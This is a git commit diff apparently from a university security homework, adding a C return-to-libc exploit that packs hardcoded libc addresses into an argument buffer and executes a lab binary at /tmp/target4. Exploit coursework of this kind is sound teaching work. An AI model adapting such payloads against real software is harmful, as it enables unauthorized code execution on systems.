cb508fcc3161dd36de158d7f2fdc6934da4be6c5
justinhalford <justinhalford@gmail.com>
2024-04-21 22:41:25 -0400

    Initial commit of project files

--- cs5435-hw4/sploits/sploitEC.c
+++ cs5435-hw4/sploits/sploitEC.c
@@ -6,21 +6,30 @@
 #include "shellcode.h"
 
 #define TARGET "/tmp/target4"
+#define LIBC_BASE 0xf7de1000
 
 int main(void)
 {
-  char *args[3]; 
+  char *args[3];
   char *env[1];
+
+  char buf[32];
+  uint32_t *addr_ptr = (uint32_t *)(buf);
+
+  *addr_ptr++ = LIBC_BASE + 0x000b8c30;
+  *addr_ptr++ = 0;
+  *addr_ptr++ = LIBC_BASE + 0x0002f7d0;
+  *addr_ptr++ = 0;
+  *addr_ptr++ = LIBC_BASE + 0x0015f294;
   
   args[0] = TARGET;
-  args[1] = "student"; 
+  args[1] = buf;
   args[2] = NULL;
-  
+
   env[0] = NULL;
+
   execve(TARGET, args, env);
   fprintf(stderr, "execve failed.\n");
 
   return 0;
 }
-
-
